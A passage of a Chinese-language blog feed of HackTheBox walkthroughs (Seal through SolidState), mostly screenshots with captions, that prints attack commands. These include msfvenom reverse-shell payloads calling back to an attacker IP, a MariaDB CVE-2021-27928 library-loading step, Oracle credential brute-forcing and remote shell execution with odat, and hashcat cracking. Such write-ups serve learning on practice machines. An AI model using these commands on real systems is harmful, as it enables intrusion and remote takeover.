                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.4lzw8mjq0hk0.webp"
                     
                ></p>
<p>感觉有个定时任务在执行打包操作，pspy64看一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.3xby3igwm660.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.10n89zaaro6.webp"
                     
                ></p>
<p>l开头貌似是可以连接文件的意思</p>
<p><code>https://jsom1.github.io/_walkthroughs/Seal</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.6fqvdrzsc180.webp"
                     
                ></p>
<p>连接luis&#x2F;.ssh文件夹，当定时任务执行后，就会将luis&#x2F;.ssh的文件打包到&#x2F;opt&#x2F;backups&#x2F;archives下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.45ndjjlxopc0.webp"
                     
                ></p>
<p>将打包文件复制到tmp目录下进行解压。uploads目录下有luis的密钥文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.6sl5ro8j2jw0.webp"
                     
                ></p>
<p>ssh连接</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.4fuqu0zm1bc0.webp"
                     
                ></p>
<p>继续提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.4udze3z3wa60.webp"
                     
                ></p>
<p>有一个sudo命令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.2951sk5jn5og.webp"
                     
                ></p>
<p>意思是用ansible-playbook命令执行yml文件时，会调用yml文件内的内容当作命令执行，在本地制作一个反弹shell的yml文件</p>
<p>​	<img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.58ssfrtcews0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.2gkh7jwl85z4.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.5fez2seh4i40.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Sense - HackTheBox</title>
    <url>/post/9a633a1ff158/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.5c2qzrtuzko0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.69lfccm7r8c0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.7497h5ofj0w0.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.64zbfdlu93s0.webp"
                     
                ></p>
<p>试试弱口令，万能密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.3zgcsd8wdn80.webp"
                     
                ></p>
<p>都不行，在爆破试试，利用burp获取post提交的数据格式</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.4wddavzjgom0.webp"
                     
                ></p>
<p>扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.79l0k64wu8o0.webp"
                     
                ></p>
<p>密码是默认值</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.29bg760u5tgk.webp"
                     
                ></p>
<p>查看主页源代码时，发现路径中包含pfsense</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.5x1vbvglvn40.webp"
                     
                ></p>
<p>搜索pfsense默认密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.75i0betm0rs0.webp"
                     
                ></p>
<p>尝试登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.35wxze6lr540.webp"
                     
                ></p>
<p>这里要用小写的rohit，大写的Rohit无法登录</p>
<p>登陆后未发现可利用信息</p>
<p>搜索一下pfsense的公开可利用exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.3ivuyxg1mz60.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.77rj29fh1qc.webp"
                     
                ></p>
<p>尝试利用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.1mz7201damsg.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.zsiljndu54w.webp"
                     
                ></p>
<p>甚至不用提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.9rmql3a1c1s.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sense/image.111pm8jfjvkw.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Shibboleth - HackTheBox</title>
    <url>/post/d2956a1e4111/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.59iop14xjvs0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.47j4arz73240.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.713dsr02lmw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.5qlw08vzreg0.webp"
                     
                ></p>
<p>添加hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.696nmy51bvg0.webp"
                     
                ></p>
<p>扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.77okzo818ig0.webp"
                     
                ></p>
<p>在利用wfuzz扫一遍子域名</p>
<p>字典：<code>https://github.com/danielmiessler/SecLists</code></p>
<p><code>wfuzz -u http://shibboleth.htb -H &quot;Host: FUZZ.shibboleth.htb&quot; -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.1j6bx079cedc.webp"
                     
                ></p>
<p>添加hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.5nguopp0kz40.webp"
                     
                ></p>
<p>登录框，标题为zabbix，搜一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.2bvwochc9gis.webp"
                     
                ></p>
<p>但是版本不明确</p>
<p>扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.15gmrq6ts9j4.webp"
                     
                ></p>
<p>扫出来的大多都需要登录才能访问</p>
<p>在扫一遍udp端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.8lvs7zoa25c.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.3t3bt0rsi8y0.webp"
                     
                ></p>
<p>623开放了一个asf-rmcp服务，不认识搜一下</p>
<p><code>https://hacktricks.boitatech.com.br/pentesting/623-udp-ipmi</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.42x7h0u97gg0.webp"
                     
                ></p>
<p>好像可以枚举ipmi服务的用户名和密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.4ajj0o5hbow0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.6iqlaem3gvw0.webp"
                     
                ></p>
<p>尝试解密</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.3l69vydfd0q0.webp"
                     
                ></p>
<p>搜索类型为7300</p>
<p><code>hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.5x866veualc0.webp"
                     
                ></p>
<p>登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.72lcao8x7ow0.webp"
                     
                ></p>
<p>知道了当前ZABBIX的版本</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.p2xjc0frv0g.webp"
                     
                ></p>
<p>有一个身份验证后的rce</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.27x4usfv6les.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.4bi37jw3ti80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.63vftlauw5s0.webp"
                     
                ></p>
<p>漏洞产生点在hosts-&gt;key这里</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.30he7858hlm0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.3u6t8dc9e2c0.webp"
                     
                ></p>
<p>10050和10051不知道是什么服务，本地还开放有3306，但配置文件无权读取</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.61pxvcoc3mg.webp"
                     
                ></p>
<p>存在另外一个普通用户，尝试用之前破解的哈希密码切换</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.6iedquh7c1g0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.3tcojwqw9440.webp"
                     
                ></p>
<p>获取数据库的账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.6ethq7ht4dc0.webp"
                     
                ></p>
<p>MariaDB数据库第一次见，搜一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.3fcg4fir9ui0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.4hgn4bp6pau0.webp"
                     
                ></p>
<p><code>https://github.com/Al1ex/CVE-2021-27928</code></p>
<p>用法也挺简单</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.wahdku4rark.webp"
                     
                ></p>
<p>先msf生成一个so后门</p>
<p><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=7777 -f elf-so -o cve.so</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.7belbzwphfw0.webp"
                     
                ></p>
<p>让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.qxse2y76qj4.webp"
                     
                ></p>
<p>在连接数据库后进行加载后门</p>
<p><code>SET GLOBAL wsrep_provider=&quot;/tmp/cve.so&quot;;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.4edvbt1p3mo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shibboleth/image.2s52upkr6220.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Shocker - HackTheBox</title>
    <url>/post/83ca457128e3/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.5isrvjxx2fc0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.4zjaiwlxs440.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.63zo8skar380.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.1x0r7j5ptrvk.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.58monzqk8800.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.1cpd5a8qlkgw.webp"
                     
                ></p>
<p>没什么可利用信息，扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.1a0a2grw9p8g.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.5l49sa5tzdc0.webp"
                     
                ></p>
<p>发现一个user.sh文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.6osot44lkxc0.webp"
                     
                ></p>
<p>下载下来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.55ncxsv5wrs0.webp"
                     
                ></p>
<p>文件内容</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.1sp315fbygw0.webp"
                     
                ></p>
<p>在利用curl看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.33xnm83jwjs0.webp"
                     
                ></p>
<p>可能是个bash命令，搜索一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.t77v0ho9g68.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.23qz6j58oiow.webp"
                     
                ></p>
<p>可用来反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.5nifego3oss0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.2o5bl25q5bc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.6hqy3tk79z40.webp"
                     
                ></p>
<p>发现lxd用户组</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.3xeepqvhqoy0.webp"
                     
                ></p>
<p>文件也存在</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.1gwlt8tv6pc0.webp"
                     
                ></p>
<p>尝试利用lxd提权</p>
<p>同样在攻击机下载文件执行后，在让靶机下载，但是，这次不行，没有权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.24nv41yog340.webp"
                     
                ></p>
<p>另寻他法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.z3pbzmp6qps.webp"
                     
                ></p>
<p>搜索一下用法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.44wldsulxye0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.587tezbbbe00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.5jn03mh02i80.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Silo - HackTheBox</title>
    <url>/post/db9844d688e0/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.7813626dbw80.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.89rs9ssgdo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.pu0bwkvdv1c.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.2qrqyfcw0te0.webp"
                     
                ></p>
<p>扫一下445</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.3n4yzgufros0.webp"
                     
                ></p>
<p>没有永恒之蓝</p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.1r7ww3ow69s0.webp"
                     
                ></p>
<p>iis欢迎界面</p>
<p>访问47001</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.1vbwkydd2pog.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.6fht9pu643s0.webp"
                     
                ></p>
<p>发现一个oracle TNS，貌似是个oracle数据库，搜一下</p>
<p><code>https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener</code></p>
<p><code>https://qtranspose.xyz/posts/htb-silo/#http</code></p>
<p>这个oracle TNS貌似可以rce</p>
<p><code>https://github.com/quentinhardy/odat</code></p>
<p>下载项目</p>
<p><code>./odat-libc2.17-x86_64 sidguesser -s 10.10.10.82 -p 1521</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.ho3dzvzjy7k.webp"
                     
                ></p>
<p>获取数据库名称为XE</p>
<p>用工具自带的字典爆破一下数据库账号密码</p>
<p><code>./odat-libc2.17-x86_64 passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/accounts_small.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.7889xjjpau00.webp"
                     
                ></p>
<p>账号密码为：<code>scott/tiger</code></p>
<p>调用模块执行代码</p>
<p><code>./odat-libc2.17-x86_64 java -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.3ezcodypd0q0.webp"
                     
                ></p>
<p>换一个模块</p>
<p><code>./odat-libc2.17-x86_64 dbmsscheduler -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.4zcee92fms40.webp"
                     
                ></p>
<p>在换另一个模块进行利用</p>
<p><code>./odat-libc2.17-x86_64 utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.4zilfythb14.webp"
                     
                ></p>
<p>利用msf生成一个反弹shell，并将其上传</p>
<p><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.17 lport=7777 -f exe -o shell.exe</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.3v4z8tcb5tg0.webp"
                     
                ></p>
<p><code>./odat-libc2.17-x86_64 utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile c:/windows/temp shell.exe /root/shell.exe</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.72mbqrmdtc40.webp"
                     
                ></p>
<p>在利用externaltable模块执行反弹shell</p>
<p><code>./odat-libc2.17-x86_64 externaltable -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --exec c:/windows/temp shell.exe</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.f31n5tjbzew.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.jo2kfj0yh14.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>SolidState - HackTheBox</title>
    <url>/post/0990c563f1ff/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.1snlv0dm298g.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.74i9l7udye40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.19eblkx2e5ls.webp"
                     
                ></p>
<p>4555端口运行了一个没见过的服务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.4fjbncc5hmy0.webp"
                     
                ></p>
<p>搜索一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.3daw88vwc200.webp"
                     
                ></p>
<p>可以用telnet连接</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.6ag8u2rlojg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.3ku2ce86lxc0.webp"
                     
                ></p>
<p>修改一下这些用户的密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.f1gxetfa1s0.webp"
                     
                ></p>
<p>然后在连接110端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.l3kg4cb87g0.webp"
                     
                ></p>
<p>查看一下邮件信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.gjiyxzzok60.webp"
                     
                ></p>
<p>第一封是一封欢迎邮件，无可利用信息</p>
<p><img  
                     lazyload
                     alt="image"
